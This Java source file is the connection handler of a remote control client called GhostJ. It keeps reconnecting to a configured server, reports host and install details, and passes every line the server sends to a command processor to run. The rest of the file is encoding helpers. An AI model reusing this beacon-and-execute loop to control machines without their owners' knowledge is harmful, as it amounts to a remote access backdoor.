package com.ghostj.client.conn;

import com.ghostj.client.cmd.CommandProcessException;
import com.ghostj.client.core.ClientMain;
import com.ghostj.client.util.FileRW;
import com.ghostj.client.util.Out;

import java.io.*;
import java.net.Socket;
import java.net.SocketAddress;
import java.nio.charset.StandardCharsets;
import java.util.Date;

/**
 *接收服务端发送的数据的线程
 * @author Rock Chin
 */
public class HandleConn extends Thread{
    /**
     * 保存了连接相关的基本信息
     */
    public static String ip;
    public static int port=1033;
    public static int rft_port=1035;
    public static SocketAddress socketAddress=null;
    /**
     * 以下保存了向服务端的io对象以及socket对象
     */
    private static OutputStreamWriter outToServer=null;
    private static BufferedReader readFromServer=null;

    public static OutputStreamWriter getOutToServer() {
        return outToServer;
    }

    public static BufferedReader getReadFromServer() {
        return readFromServer;
    }

    private static Socket socket=null;
    public static void closeSocket()throws Exception{
        socket.close();
    }
    @Override
    public void run(){
        String verOfThisClient=FileRW.read("nowVer.txt");
        //启动startup
        new Thread(()-> {
            try {
                Thread.sleep(5000);
                HandleConn.writeToServerIgnoreException("!startup!");
                Thread.sleep(Long.parseLong(ClientMain.config.getStringAnyhow("startupDelay","30000")));
                ClientMain.processor.start("!!startup");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
        //反复尝试连接
        while (true){
            try {
                long st=new Date().getTime();
                try {
                    socket=new Socket();
                    socket.connect(socketAddress, 30000);
                } catch (IOException e) {
                    Out.say("HandleConn","无法建立连接，正在尝试重新连接");
                    e.printStackTrace();
                    try{ sleep(10000-(new Date().getTime()-st)); }catch (Exception ignored){ ; }
                    continue;
                }
                /**
                 * 为io对象赋值
                 */
                outToServer=new OutputStreamWriter(socket.getOutputStream(),StandardCharsets.UTF_8);
                readFromServer=new BufferedReader(new InputStreamReader(socket.getInputStream(),"GBK"));
                //连接正常
                Out.say("HandleConn","已连接");
                //发送info
                writeToServer("!info "+ ClientMain.name+" c"+ verOfThisClient
                        +" "+ ClientMain.sysStartTime+" "+ ClientMain.installTime+"!");
                //运行启动任务
//                ClientMain.processor.start("!!startup");
                /**
                 * 轮询信息
                 */
                while (true) {
                    String cmd = getReadFromServer().readLine();
                    Out.say(cmd);
                    /**
                     * 发送到processor执行,并行执行
                     */
                    try {
                        ClientMain.processor.start(cmd);
                    }catch (Exception e){
                        writeToServer(ClientMain.getErrorInfo(e));
                    }
                }
            }catch (Exception e){
                Out.say("HandleConn","连接错误");
                e.printStackTrace();
                try {
                    socket.close();
                }catch (Exception ignored){}
            }
        }
    }



    public static String getEncoding(String str) {
        String encode = "GB2312";
        try {
            if (str.equals(new String(str.getBytes(encode), encode))) { //判断是不是GB2312
                String s = encode;
                return s; //是的话，返回“GB2312“，以下代码同理
            }
        } catch (Exception exception) {
        }
        encode = "ISO-8859-1";
        try {
            if (str.equals(new String(str.getBytes(encode), encode))) { //判断是不是ISO-8859-1
                String s1 = encode;
                return s1;
            }
        } catch (Exception exception1) {
        }
        encode = "UTF-8";
        try {
            if (str.equals(new String(str.getBytes(encode), encode))) { //判断是不是UTF-8
                String s2 = encode;
                return s2;
            }
        } catch (Exception exception2) {
        }
        encode = "GBK";
        try {
            if (str.equals(new String(str.getBytes(encode), encode))) { //判断是不是GBK
                String s3 = encode;
                return s3;
            }
        } catch (Exception exception3) {
        }
        return "";
    }


    /**
     * 向服务端发送消息
     * @param msg
     */
    public static void writeToServer(String msg)throws Exception{
        System.out.println("Encoding:"+getEncoding(msg)+":"+msg);
        System.out.println("->ConvertUTF8:"+new String(getUTF8BytesFromGBKString(msg), StandardCharsets.UTF_8)
                +" encoding:"+getEncoding(new String(getUTF8BytesFromGBKString(msg), StandardCharsets.UTF_8)));
        getOutToServer().write(new String(getUTF8BytesFromGBKString(msg),StandardCharsets.UTF_8));
        getOutToServer().flush();
    }




    public static byte[] getUTF8BytesFromGBKString(String gbkStr) {
        int n = gbkStr.length();
        byte[] utfBytes = new byte[3 * n];
        int k = 0;
        for (int i = 0; i < n; i++) {
            int m = gbkStr.charAt(i);
            if (m < 128) {
                utfBytes[k++] = (byte) m;
                continue;
            }
            utfBytes[k++] = (byte) (0xe0 | (m >> 12));
            utfBytes[k++] = (byte) (0x80 | ((m >> 6) & 0x3f));
            utfBytes[k++] = (byte) (0x80 | (m & 0x3f));
        }
        if (k < utfBytes.length) {
            byte[] tmp = new byte[k];
            System.arraycopy(utfBytes, 0, tmp, 0, k);
            return tmp;
        }
        return utfBytes;
    }

    /**
     * 向服务端发送消息
     * @param msg
     */
    public static void writeToServerIgnoreException(String msg){
        try {
            writeToServer(msg);
        }catch (Exception e){}
    }
    /**
     * 向服务端发送命令执行完毕的信息
     */
    public static void sendFinishToServer(){
        try{
            HandleConn.writeToServerIgnoreException("!finish!");
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
